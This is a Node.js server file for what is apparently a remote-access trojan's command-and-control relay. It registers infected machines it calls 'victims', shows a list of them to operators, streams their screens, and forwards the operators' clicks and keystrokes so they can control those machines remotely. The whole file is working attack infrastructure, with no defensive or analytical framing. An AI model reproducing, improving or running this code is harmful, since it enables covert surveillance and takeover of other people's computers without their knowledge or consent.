const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  transports: ["websocket", "polling"],
  cors: { origin: "*" },
  maxHttpBufferSize: 10 * 1024 * 1024,
  pingTimeout: 60000,
  pingInterval: 25000
});

const PORT = process.env.PORT || 8080;

// ── State ──
// Victims: victimId -> { socket, info }
const victims = new Map();
// Viewers: socket -> { viewing: victimId }
const viewers = new Map();
// Active frame streams: victimId -> Set of viewer sockets
const frameStreams = new Map();

// ── Serve client HTML ──
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "client.html"));
});

app.get("/healthz", (req, res) => {
  res.status(200).send("OK");
});

// ── Socket.IO ──
io.on("connection", (socket) => {
  console.log(`[+] Connection: ${socket.id}`);

  // ── VICTIM REGISTRATION ──
  socket.on("register-victim", (data) => {
    const victimId = data.id || socket.id;
    victims.set(victimId, {
      socket,
      w: data.w || 1920,
      h: data.h || 1080,
      connectedAt: Date.now()
    });
    socket.victimId = victimId;
    socket.role = "victim";

    console.log(`[VICTIM ONLINE] ${victimId} (${data.w}x${data.h})`);

    // Notify all viewers that victim list changed
    broadcastVictimList();

    // Start frame stream handler for this victim
    socket.on("frame", (frameData) => {
      // Only forward frames if someone is actively viewing this victim
      const stream = frameStreams.get(victimId);
      if (stream && stream.size > 0) {
        stream.forEach((viewerSocket) => {
          if (viewerSocket.connected) {
            viewerSocket.emit("frame", { victimId, buf: frameData.buf });
          } else {
            stream.delete(viewerSocket);
          }
        });
      }
    });

    socket.on("disconnect", () => {
      console.log(`[VICTIM OFFLINE] ${victimId}`);
      victims.delete(victimId);
      frameStreams.delete(victimId);
      broadcastVictimList();
    });
  });

  // ── VIEWER (browser) REGISTRATION ──
  socket.on("register-viewer", () => {
    socket.role = "viewer";
    viewers.set(socket, { viewing: null });
    console.log(`[VIEWER ONLINE] ${socket.id}`);

    // Send victim list immediately
    const list = getVictimList();
    socket.emit("victim-list", list);

    socket.on("select-victim", (victimId) => {
      const victim = victims.get(victimId);
      if (!victim) {
        socket.emit("error", { msg: "Victim not available" });
        return;
      }

      // Unsubscribe from previous victim
      const prev = viewers.get(socket);
      if (prev && prev.viewing) {
        const prevStream = frameStreams.get(prev.viewing);
        if (prevStream) {
          prevStream.delete(socket);
          if (prevStream.size === 0) {
            // Tell victim to slow down when nobody's watching
            victim.socket.emit("viewer-count", 0);
          }
        }
      }

      // Subscribe to new victim
      viewers.set(socket, { viewing: victimId });
      if (!frameStreams.has(victimId)) {
        frameStreams.set(victimId, new Set());
      }
      frameStreams.get(victimId).add(socket);

      // Tell victim someone is watching (they should start sending frames)
      victim.socket.emit("viewer-count", frameStreams.get(victimId).size);

      // Send victim info
      socket.emit("victim-info", {
        id: victimId,
        w: victim.w,
        h: victim.h
      });

      console.log(`[VIEWING] ${socket.id} -> ${victimId}`);
    });

    socket.on("click", (data) => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) return;
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        victim.socket.emit("click", { x: data.x, y: data.y, btn: data.btn || "left" });
      }
    });

    socket.on("key", (key) => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) return;
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        victim.socket.emit("key", key);
      }
    });

    socket.on("disconnect", () => {
      console.log(`[VIEWER OFFLINE] ${socket.id}`);
      const viewer = viewers.get(socket);
      if (viewer && viewer.viewing) {
        const stream = frameStreams.get(viewer.viewing);
        if (stream) {
          stream.delete(socket);
          if (stream.size === 0) {
            const victim = victims.get(viewer.viewing);
            if (victim) {
              victim.socket.emit("viewer-count", 0);
            }
          }
        }
      }
      viewers.delete(socket);
    });
  });

  // ── Viewer requests victim list ──
  socket.on("get-victims", () => {
    if (socket.role === "viewer") {
      socket.emit("victim-list", getVictimList());
    }
  });
});

function getVictimList() {
  const list = [];
  for (const [id, victim] of victims) {
    list.push({
      id,
      w: victim.w,
      h: victim.h,
      connectedAt: victim.connectedAt
    });
  }
  return list;
}

function broadcastVictimList() {
  const list = getVictimList();
  for (const [socket, viewer] of viewers) {
    if (socket.connected) {
      socket.emit("victim-list", list);
    }
  }
}

server.listen(PORT, "0.0.0.0", () => {
  console.log(`[SERVER] Listening on http://0.0.0.0:${PORT}`);
});
